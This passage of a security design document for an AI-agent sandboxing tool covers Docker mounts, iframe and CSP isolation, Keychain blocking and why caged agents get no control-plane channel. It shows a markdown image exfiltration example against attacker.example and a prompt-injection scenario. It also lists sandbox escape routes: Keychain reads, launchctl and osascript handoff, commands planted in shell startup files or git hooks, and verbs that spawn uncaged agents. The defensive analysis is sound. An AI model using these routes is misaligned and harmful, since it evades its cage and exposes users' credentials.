- **Custom-agent opt-in**: for anything outside `docker::KNOWN_SAFE_AGENTS` (claude/codex/copilot/agy/opencode/pi/omp/muse/cursor; omp's installer drops its binary in `~/.local/bin`, outside the mounted `~/.omp`, so the mount cannot shadow it) - including every custom agent a user adds - `docker_agent_extra_dirs` mounts NOTHING unless `Settings.docker_agent_persist_enabled` is also true for that agent id. Off by default even for a brand-new agent. This is deliberate: `agent_config()` has no confirmed state dir for an agent it's never seen, and guessing one risks the exact failure `agent_dirs.rs` documents for grok/agy - an empty dir mounted over a path that ALSO holds a binary baked into the image at build time silently shadows it. grok itself is a PERMANENT exception (`docker::persist_offerable` returns `false` for it, and `agent_config` refuses it outright regardless of the opt-in) - its binary lives inside its own `~/.grok` config dir, so no warning text can make that combination safe. The frontend hides the opt-in toggle entirely for grok rather than offering one that can never do anything.
- **Unified allow-list with Seatbelt**: Docker's `build_spec` now takes the SAME live-rendered list Seatbelt's `sandbox::provision` reads (`live_sandbox_lists` in `lib.rs`: global Settings defaults + the task's own pinned `sandbox_rw_paths` + the project's committed `.termic.yaml`, re-read fresh on every spawn) and mounts every plain entry rw at its own resolved absolute path - same convention as the worktree and composition members. Before this, switching a task from Seatbelt to Docker silently dropped every extra allowed directory; now the two engines agree on "what's allowed" and only differ in enforcement mechanism. `regex:`-prefixed entries are Seatbelt-only (no literal path to mount) and are skipped; a path already covered by an implicit mount (the worktree itself, a composition member) is deduped rather than mounted twice.
- **Per-task extra mounts**: `Task.docker_extra_mounts` (`Vec<String>`, `host_path:container_path` entries, Docker's own `-v` shape) is a DEDICATED field, deliberately NOT part of `sandbox_rw_paths`/"Allowed paths" - that list is shared with Seatbelt via `live_sandbox_lists` and has no concept of a container path, so a `host:container` entry there would be ambiguous the moment a Seatbelt task reuses the same global/project default. Unlike the worktree/git-metadata mounts (host path == container path, a git `commondir`-pointer requirement, not a choice), an extra mount's container path is a free user choice with no same-path constraint. The use case is narrow and intentional: persisting something a fresh container otherwise loses on every restart that the built-in per-agent config dir doesn't cover (a custom MCP server's own data dir, say) - not a general bind-mount escape hatch. `docker::sanitize_extra_mount` validates each entry at spawn time (host: `$HOME`/`$WORKSPACE`-expanded via `subst_path`, must resolve to a non-empty absolute path; container: absolute, no `..`, and not under `docker::UNSAFE_MOUNT_TARGET_ROOTS` - `/root` and every system dir an empty mount could shadow or reach into) and silently drops a malformed entry, same as every other sandbox list parser in this file; `docker::validate_extra_mounts` runs the same container-path shape checks at SAVE time (`task_set_docker`) so a malformed entry surfaces as an error to the user instead of silently vanishing. **No host side in termic's data dir**: the data dir holds the sync clone, every agent's Docker login, the forge logins and the CLI token, so a host path that resolves to it or into it (`docker::resolve_host`: canonicalised, symlinks followed, the deepest existing ancestor when the leaf does not exist yet, since Docker creates a missing bind source) is refused at save by `docker::refuse_data_dir_mounts` (called from `validate_extra_mounts`, and by `project_update` / `settings_save` when `Project.docker_extra_mounts` / `Settings.docker_default_extra_mounts` change) and skipped at spawn by `build_spec`, so a value already on disk, or one using `$WORKSPACE`, cannot slip through either. Pinned by `docker::tests::an_extra_mount_cannot_take_termics_data_dir_or_anything_in_it` and `an_extra_mount_cannot_reach_the_data_dir_through_a_symlink`. An ANCESTOR of the data dir (`$HOME`) is not refused. Runs LAST among `build_spec`'s mount steps so it can dedupe against every mount staged above by either host OR container path - a mount whose container path collides with an already-claimed one (the agent config dir, say) is dropped rather than silently shadowing it. Editable post-create via `task_set_docker(id, enabled, extra_args, extra_mounts)` (`TaskSandboxDialog`'s "Extra mounts" field, saved + SIGKILLs like the rest of that command), and settable at creation too: `CreateTaskArgs`/`CreateMultiArgs`/`task_open_repo`/`task_import_worktree` all take an optional `docker_extra_mounts` override (`NewTaskDialog`'s own "Extra mounts" field, shown under the Docker card in every task-creation shape including the main-checkout/import paths) - unset falls back to `Settings.docker_default_extra_mounts` when Docker mode is on, `Vec::new()` otherwise.
- **Default extra mounts**: `Settings.docker_default_extra_mounts` (Settings → Docker Sandbox → "Default extra mounts", same `host_path:container_path` format and `ListField` widget as a task's own field) is the Settings-level companion - unioned into a NEW Docker-sandboxed task's `docker_extra_mounts` at creation time (`NewTaskDialog` seeds its field from this, same convention as `sandbox_default_rw_paths` seeding a project's allow-list), then owned entirely by the task from then on: editing the default later only affects tasks created from now on, and a task can freely edit/remove/add past whatever it was seeded with. Global rather than per-agent, unlike "Per-agent config dirs" above - an extra mount's use case (persisting an MCP server's own data dir, say) isn't tied to which agent is running. Only the data-dir refusal runs at `settings_save` (and only when the list changed); the shape is not validated there (same lazy-validation precedent as `docker_agent_extra_dirs`): a malformed entry is silently dropped by `docker::sanitize_extra_mount` wherever it would actually become a mount.
- **Command preview**: `docker_command_preview(task_id, agent_id?)` calls the exact `build_spec`/`render_argv` the real spawn path uses (never a separate approximation, so it can't drift) and returns the argv + annotated `DockerSpec.mounts` (each with its `why`) to the frontend. Shown behind a "Preview command" toggle in `TaskSandboxDialog`'s Docker section. Works even before the image is built (falls back to a `<image not built yet>` placeholder tag) so it stays useful as a "what would this actually do" check while still setting Docker mode up. Not byte-exact for the *command itself* (a real launch also mints/resumes a session id and composes YOLO flags, frontend-side logic this command doesn't have access to) - but the mounts/env/hardening flags, the security-relevant part this exists to show, are identical either way.
- **How Settings → Agents & Terminals relates to Docker mode**: Docker mode is not a separate set of agents - it's an alternative CONTAINER for the same agents configured there. The command + args to run, any resolved CLI flags (YOLO, etc.), and `Agent.env` (the per-agent `KEY=VAL` block, via `SpawnArgs.env` / `envForCli`) all carry over into the container's argv/`-e` flags, appended after the base `TERM`/`COLORTERM`/relocation-env so a per-agent value wins on key collision - same precedence as the unsandboxed/Seatbelt path. What does NOT carry over: `Agent.sandbox_allowed_paths` is Seatbelt-only and is simply unused in Docker mode (fixed mounts, not an allow-list), and the raw inherited HOST environment (API keys sitting in your shell, say) is deliberately NOT passed through - Docker's isolation model relies on the mounted per-agent config dir for credentials/login instead.

## Known gap: the webview is outside the cage

The seatbelt + CONNECT proxy cage the **agent process**. They do not cage the
**webview**, which makes its own network requests as the app itself. Anything
the webview can be made to fetch is egress the proxy allowlist never sees.

There was one such path (#65): `img-src` in `tauri.conf.json` allows any
`https:` origin, so the markdown preview could render remote images.
Previewing

```markdown
![](https://attacker.example/x.png?d=<data>)
```

used to fire a GET to an arbitrary host on render, with no click and no
prompt, even when the task is in `Enforce` and the agent itself cannot reach
that host.

The realistic trigger was never a scheming agent, it's **prompt injection
plus untrusted markdown**. An agent reads a dependency's README, a GitHub
issue, or a fetched page, and that text tells it to write the image tag. The
same applies to markdown the agent never touched: a contributor's fork, a
submodule, a vendored package. Only a GET was ever possible (no script:
`script-src 'self'`, markdown-it runs with `html:false` and blocks
`javascript:`), so the payload was limited to what the markdown's author
could encode in a URL, plus the viewer's IP, user-agent, and timing. GitHub
and VS Code make the same tradeoff for their previews, but not on by default.

Closed in #69: `gateRemoteImages()` in `MarkdownPreview.tsx` intercepts every
`http(s):` `<img>` src before it ever reaches the DOM's `src` attribute,
gated on a default-OFF `loadRemoteImages` pref (Settings → General) or a
per-tab override set from the preview's own "blocked images" banner. The CSP
itself is unchanged, still allows `https:` in `img-src` — this is a renderer
gate, not a CSP tweak, per the note below.

**Before widening the CSP again, remember it is app-wide.** `connect-src` or
`script-src` would be materially worse than `img-src` is.

## HTML preview: the iframe is the boundary

`.html` / `.htm` tabs render in `HtmlPane.tsx` as
`<iframe sandbox="" srcdoc>`, fed from the editor's live buffer. The
document is untrusted (an agent's report, a page inside a dependency, a
file a prompt-injected agent wrote on purpose), and the webview can call
every Tauri command, so script running in the app's origin is code
execution on the machine. Nothing sanitizes the markup; isolation does the
work, which is also how VS Code webviews, GitHub's raw files
(`CSP: default-src 'none'; style-src 'unsafe-inline'; sandbox`) and
Claude.ai artifacts do it. JupyterLab's "Trust HTML" mode is the shape NOT
to copy: it adds `allow-scripts` to an `allow-same-origin` frame, which is
same-origin with scripts.

The gates, in the order a hostile document meets them:

1. **`sandbox=""`**: opaque origin, no scripts, forms, popups or top-level
   navigation. Measured: without the attribute a srcdoc frame shares the
   app's origin and reaches its globals, `__TAURI_INTERNALS__` included.
   `allow-scripts` together with `allow-same-origin` would undo it.
2. **The inherited CSP.** A srcdoc document inherits the app's policy, so
   `script-src 'self'` blocks inline and external script independently of
   the sandbox. A consequence worth knowing before anyone asks for it:
   scripts CANNOT be enabled for this preview without loosening the policy
   of the whole app, because a document's own `<meta>` CSP only narrows.
3. **Tauri, if a script ever did run.** It can post to WebKit's native
   message handlers (measured). Tauri injects its IPC bridge and per-launch
   invoke key into the main frame only (`for_main_frame_only` in tauri
   2.11.1 `manager/webview.rs`, the fix for GHSA-57fm-592m-34r7), wry
   reports the frame's URL as `about:srcdoc`, and `is_local_url` does not
   count that as local, so app commands are refused. The `ipc:` fetch path
   rejects the `Origin: null` an opaque frame sends. Read from source, not
   measured.

`lib/htmlPreview.ts` then prepends a narrowing policy
(`default-src 'none'; style-src 'unsafe-inline'; img-src data:` plus
`data:` fonts and media), a no-referrer meta and `<base href="about:srcdoc">`.
That closes the CSP-governed egress the inherited policy leaves:
`img-src https:` would let a remote image or CSS `url()` fire a GET on
render, the #65 hole again. `https:` joins `img-src` only through the same
`loadRemoteImages` pref and per-tab "Show images" override the markdown
preview uses. One residual is NOT covered: `<link rel="dns-prefetch">` and
`rel="preconnect"` are resource hints outside CSP, and a hostname can carry
data (the #65 shape over DNS instead of a GET). Whether WebKit acts on them
inside a sandboxed srcdoc is unmeasured.

**Placement is the trap.** WebKit ignores a CSP `<meta>` that lands in
`<body>`, including one written into `<head>` after anything that
implicitly opens the body (measured). Raw-prepending it as the first token
always lands it in the head, and nothing a document writes later can undo
it: its own CSP only narrows further, and the FIRST `<base>` wins. The
parser then drops the document's `<!DOCTYPE>`, which costs nothing because
a srcdoc document is always in standards mode (measured `CSS1Compat`).

**Do not swap srcdoc for a custom scheme** (a `taskhtml:` shaped like
`taskpdf:`) without redoing this analysis. It would make relative CSS and
images resolve, but `is_local_url` treats ANY registered scheme as local,
so a frame there that reached the message handler would be the app as far
as the ACL is concerned, and only the invoke key would stand in the way. It
also needs `frame-src` widened: `frame-src 'none'` blocks a custom-scheme
frame (measured) but does not apply to srcdoc (`about:` URLs are exempt).
Running a document's scripts for real means a second webview with no
capability, not a looser frame.

**`tauri dev` is weaker.** The dev page comes straight from Vite, and
Tauri only proxies the dev server on mobile (`PROXY_DEV_SERVER`), so no CSP
reaches the dev webview and gate 2 does not exist there. The `make e2e`
binary serves `frontendDist` over `tauri://` with the policy, so that is
where `e2e/specs/editor.e2e.ts` ("html preview") pins this. Read from
source, not measured. Linux is a separate audit: Tauri documents that it
cannot tell an iframe's IPC request from the window's there.

What the probe measured (a standalone WKWebView with the app's exact CSP
served as a header from a fake `tauri://localhost`; a second run with
`'unsafe-inline'` in `script-src` and a scheme in `frame-src` is the
control):

| Case | App CSP | Control |
| --- | --- | --- |
| `sandbox=""` srcdoc, inline `<style>` | renders | renders |
| `allow-scripts` srcdoc, inline `<script>` | blocked | runs |
| `allow-scripts` srcdoc, external `<script src>` | not fetched | not fetched |
| srcdoc remote image, no narrowing meta | fetched | fetched |
| same, narrowing meta first | not fetched | not fetched |
| narrowing meta inside `<body>` | ignored | |
| frame `src` on a custom scheme | blocked | loads |
| link click out of the frame | no request | navigates |
| `target=_blank` / `target=_top` link | blocked | blocked |
| `#anchor` link, no `<base>` | dead | dead |
| `#anchor` link, `<base href="about:srcdoc">` | scrolls | scrolls |
| relative `<img>` / `<link>`, no `<base>` | fetched from `tauri://localhost` | same |
| sandboxed frame script sees `window.webkit.messageHandlers` | (no script) | yes, can post |
| scroll across `display:none` on the host (same-origin frame, so the parent could read it) | kept | kept |

## Known gap: one uncontained file read (`file_read_external`)

Every other renderer → filesystem read is bounded by a task root
(`safe_task_path` / `safe_task_read_path`, which reject absolute paths and
`..` outright). `file_read_external` is the single exception, added for
GH #240: a cmd+clicked absolute path in terminal output that resolves
OUTSIDE the task has no task-relative form, so it cannot go through the
contained read, and the tab it opens is read-only.

What this adds is an arbitrary file **read** reachable from the webview. It
is accepted, bounded three ways:

- **Read only.** There is deliberately no absolute-path write counterpart.
  `task_file_write` keeps its containment check, and the tab the read feeds
  is `EditorState.readOnly` with its ⌘S path stubbed out. Nothing can be
  mutated outside a task through this.
- **Text only, capped.** The same 2 MB ceiling as the task read, plus a
  UTF-8 requirement, so it is a text channel rather than a way to pull bytes
  out of arbitrary binaries.
- **Text only in the preview too.** An external `.md` renders in the
  markdown preview, whose links open further external tabs through this
  same read. Relative IMAGES beside it are not loaded: that would need an
  uncontained binary read, and adding one would widen this gap rather than
  reuse it.
- **Nowhere to send it.** The pinned CSP (`connect-src`, see
  `src/lib/cspGuard.test.ts`) means an attacker who could invoke it has no
  egress for the result.

The residual risk is an XSS in our own UI turning into local file
disclosure. That is strictly worse than before this command existed, and is
the reason `connect-src` must not be widened (see the CSP rule in
CLAUDE.md). The bounds above are pinned by `external_read_*` tests in
`src-tauri/src/lib.rs`.

## Keychain: open by default, blockable per task

**Default (open).** The header allows all `mach-lookup`, which includes
the Keychain services, and `~/Library/Keychains` is on
`builtin_runtime_paths` (read+write). Per-item ACLs do not protect much:
gh stores its token via go-keyring, which shells out to
`/usr/bin/security`, and git's osxkeychain helper is Apple signed, so
those items trust Apple tools, and securityd checks the binary that asks,
not its parent. A caged agent reads gh's token and git's HTTPS
credentials with no prompt, and can delete, replace or copy out
`login.keychain-db`.

**The block.** `Task.sandbox_block_keychain`, one checkbox
(`KeychainBlockField`) in `NewTaskDialog`, `ScheduleDialog` (new
parent), `TaskSandboxDialog` and `EditTaskDialog`, shown for Enforce and
Enforce FS only. At create it rides on every create path
(`CreateTaskArgs`, `CreateMultiArgs`, `task_import_worktree`,
`task_open_repo`), so the first spawn is already blocked; the CLI's `termic new` has no flag for it yet and creates it
off. Afterwards it is saved through `task_set_sandbox(block_keychain)`
and applied on the next spawn like any profile change. Scheduled runs
copy their parent's (`runSpecFromParent` -> `task_open_repo`), so a run
is never looser than the task it came from.

The flag survives a trip through Monitor, Off or Docker: a save whose
row is hidden sends `None`, which keeps the stored value. Leaving Docker
saves without showing the row, so its confirm names the block when it
is about to apply again. Anything that shows it reads
`keychainBlocked(task)` (flag AND an enforcing mode), never the raw
field.

The footer does not trust the stored flag alone. Every task agent PTY
that can reach the Keychain holds a `KeychainHold` for its lifetime,
counted in `KEYCHAIN_OPEN`: a caged one whose profile left it open
(`provision`), and an uncaged one, Off or a failed provision
(`pty_spawn`, which knows there is no bundle). `sandbox_deny_counts`
reports that count (`keychain_open`) on the poll the footer already
makes. Nonzero reads "Keychain block applies on restart"; zero reads
"Keychain blocked"; before the first answer, or after a failed poll, the
suffix is not shown at all, since "blocked" is a claim and never a
default. Whether the profile blocks comes from one function,
`blocks_keychain`, which both the renderer and `provision` call.

When set, `render_profile_with` emits `KEYCHAIN_MACH_DENY` and a
read+write deny on `~/Library/Keychains`. The Mach list is every
Keychain service `launchctl print gui/$UID` / `system` shows on macOS
26: SecurityServer, every `com.apple.securityd*` endpoint (secd: the
data-protection keychain, the system keychain, CKKS / SOS sync), the
keychain agents and sync helpers, and every `com.apple.ctkd*`
(CryptoTokenKit, smart-card and token identities). The dir deny is
emitted for the literal path and, when it differs, its resolved form,
mirroring the runtime allow loop; otherwise a symlinked home keeps its
resolved allow. Both come after every file allow, the control plane's
login-store re-allow included, so last-match-wins makes them final. An "allow this path" from the deny UI
would be emitted earlier and lose, so for a blocked task the popover
shows Keychain denials without an Allow, and
`task_sandbox_add_allowed_path` refuses paths under
`~/Library/Keychains` (either form, compared through symlinks) rather than clear the row and lift a dead entry
into the project defaults. Monitor ignores the flag (observe, never
block). Docker needs nothing: the container never sees the host
Keychain.

Measured 2026-10-09 on macOS 26.5 with fake items, the task's real
EnforceFs profile run through `sandbox-exec` from an uncaged shell:

| Probe | Open | Blocked |
|---|---|---|
| `security find-generic-password -w` | leaked | exit 44 |
| `git credential-osxkeychain get` | leaked | -50 |
| python ctypes `SecKeychainFindGenericPassword` | leaked, no prompt | -50 |
| write in / read `~/Library/Keychains` | allowed | denied |
| curl, python urllib, node fetch | 200 | 200 |
| gh (Go platform verifier), fake token | | 401, no x509 error |
| claude with its Keychain login | logged in | logged out |
| claude `/login` inside the blocked cage | | logged in, `0600` `.credentials.json` in the config dir |

The python row is why the fix is a Mach deny: any Apple-signed binary
calling Security.framework reads these items silently, so denying exec
of `security` or the git helper closes nothing.

Beyond the table, and what it does not cover, so do not read the block
as complete:

- the table above was measured with the original four service names.
  The list was then widened from the `launchctl` enumeration, and
  re-measured 2026-10-12 against the same task's real EnforceFs profile
  in three variants (block stripped, original four, wide): wide and the
  original four matched on every row. `security list-keychains` and
  `ls ~/Library/Keychains` fail; `SecItemCopyMatching` with
  `kSecUseDataProtectionKeychain` returns -25291 (errSecNotAvailable)
  instead of -25300 (not found), so the data-protection keychain was
  already cut off by `securityd.xpc`; curl, python urllib and node fetch
  return 200; gh with a fake token gets its 401 with no x509 error;
  claude `/login`, codex and gemini start inside the blocked task. The
  extra names (the rest of `securityd*`, `ctkd*`, the sync helpers) are
  defence in depth. `keychain_block_cuts_off_securityd_in_the_cage`
  repeats the dir and data-protection probes with a positive control;
  like every live cage test it needs an uncaged shell. Service names
  move between macOS releases: re-enumerate when a new one ships.
- the header still allows every other `mach-lookup`, launchd included,
  but the operations that hand work to something outside the cage are
  separate Seatbelt operations the header never allows, so `(deny
  default)` refuses them. Measured 2026-10-12 on macOS 26.5, same
  EnforceFs profile, each route trying to run `security list-keychains`
  outside the cage into `/private/tmp`, with an uncaged positive
  control per route (all four controls ran it):

  | Route | Seatbelt operation | Caged |
  |---|---|---|
  | `launchctl submit` | `job-creation` | blocked |
  | `open x.command` | `lsopen` | blocked |
  | `osascript` telling Terminal to `do script` | `appleevent-send` | blocked |
  | `osascript` `do shell script` (in-process) | none, stays caged | runs, Keychain unreachable |

  The header is shared by every enforcing cage, so this holds with or
  without the Keychain block.
- what the table above does not close: delayed handoff through files
  the cage can write and something uncaged later runs. The shell
  startup files on the runtime list (`.zshrc`, `.zshenv`, `.zprofile`,
  `.bashrc`), the parent repo's `.git/` (hooks, `core.fsmonitor`) and
  the task's setup / run scripts all execute outside the cage (an
  AuxTerminal, your own terminal, termic's own `git`). An agent can
  plant a `security find-generic-password` there and read its output
  on the next run. Not fixed by the Keychain block; anything that
  claims an agent cannot see a Keychain secret has to close these
  first, or say "cannot read it directly".

TLS does not need the Keychain services in any stack tried (Codex and
sandbox-runtime keep `SecurityServer` "for TLS"; not needed here).

**Why the dir is not read-only for everyone.** With the services
reachable and the dir read-only, `security add-generic-password` fails
(`SecKeychainItemCreateFromContent: UNIX[Operation not permitted]`): the
legacy keychain is written by the client process, not by securityd. An
agent keeping its login in the Keychain would fail to persist an OAuth
refresh and log itself out later. So the dir deny only ships with the
Mach deny.

**Cost.** Agents that keep their login in the Keychain lose it in a
blocked task. claude: one `/login`, stored in its config dir. codex:
already a file. gemini: expected to fall back to its encrypted file
store (unverified; `GEMINI_FORCE_FILE_STORAGE=true` forces it). copilot
and muse: Keychain-backed, fallback not measured. The file login is the
agent's own token, which it can use anyway; what the block protects is
everyone else's credentials. claude's `/login` lands in the config dir
the task uses, which for the default account is the shared `~/.claude`:
the file outlives the task and every task on that account reads it. It
is not retroactive: a copy of `login.keychain-db` made while the task
was open stays readable. It does not cover secrets reached other ways
(inherited env, anything on the allow-list such as `~/.local/share`).

**Open: the default.** Leaving it off means every enforced task can read
the Keychain items above. Turning it on for new tasks is the better
posture once every built-in agent has a measured file fallback; until
then it is opt-in. A stopgap that needs no termic change:
`gh auth login --insecure-storage` and `credential.helper store` move
those two credentials into files the cage already denies.

## Known gap: Monitor mode reaches the CLI control plane

The CLI control socket (docs/plans/cli.md) is denied to `Enforce` /
`EnforceFs` agents as the final SBPL rules (socket + data-dir denies). It
is deliberately NOT denied in `Monitor` mode, whose contract is
observe-never-block: a monitored agent renders `(allow default (with
report))`, so if the CLI is enabled it can reach the socket and read the
token, and that access simply shows up in the file-op / activity log. This
is the accepted trade-off of Monitoring being a pure observer; the cage
that actually enforces the boundary is `Enforce`/`EnforceFs`. (Same spirit
as the webview gap above: a documented, accepted exposure, not a leak.)

## Settled: a caged agent gets NO channel to another agent

Recurring proposal, rejected 2026-08-24. The agent-to-agent protocol
(docs/cli-agent-instructions.md) has one side prompt the other when its
work is done, and an `Enforce` / `EnforceFs` agent cannot take part: it
cannot reach the socket or read the token. The task menu's "Copy agent
CLI briefing" prints a line saying so on caged tasks. That line is
correct behaviour, not a TODO.

Do not "fix" it by letting caged agents reach the control plane. The
verbs are a straight escape (`new --sandbox off --yolo` spawns an uncaged
agent; `apply` writes past the FS allow-list; `attach` types into an
uncaged agent), so any proposal has to narrow them, and the narrow ones
do not survive either:

- **Report-back-only `send`.** Bounds the verb, not the payload. "Run
  this for me" is text, and the recipient is uncaged.
- **Reply-only addressing** (may only send to tasks that first sent to
  it). Bounds the audience, not the payload, and picks the *worst*
  audience: the one correspondent it is guaranteed to have is an agent
  already collaborating with it, so the most likely to comply. This
  makes the deputy more confused, not less.

A cage with a text channel to something uncaged is not a cage. The
supported way for a caged agent to report is the one the briefing
prints: have it write a file inside its own worktree and read that from
outside. If you need the prompt-back protocol, run the task in `Monitor`
(which reaches the CLI by contract, see the gap above) or uncaged.

## Paired machines (LAN sharing)

[peers.md](peers.md). A caged agent has no control plane, so it has no
`--peer` either: forwarding goes through the same socket and MCP surface
the cage denies. In the other direction, a verb arriving FROM a paired
machine runs with whatever sandbox the request asks for, or the
project's default, so a peer allowed to Drive agents can start an
uncaged YOLO agent here. That is why Drive is described as remote code
execution. The machine-level "Reply only" grant is not the reply-only
addressing rejected above: that was a channel out of a cage, this is a
person deciding what another computer they paired may do, and peers.md
says plainly that it is still a prompt typed into an agent. LAN sharing
sits outside the sandbox threat model the same way the MCP endpoint does.

## Do NOT

- Sandbox AuxTerminal, setup, run, or archive scripts.
- Expose `task_set_sandbox` without SIGKILLing live PTYs by default. `kill_live=false` is an explicit escape hatch with a warning — don't make it the default.
- Widen `tauri.conf.json`'s CSP without reading "Known gap" above. It applies to the whole webview, not to the component you are working on.
- Make `~/Library/Keychains` read-only without the Keychain Mach deny (breaks every agent's token refresh), or replace that deny with exec denies on `security` (any Apple binary reads the same items). See "Keychain" above.
- Give caged agents any path to another agent (control plane, scoped token, notify side channel). See "Settled" above for why the narrow versions fail too.
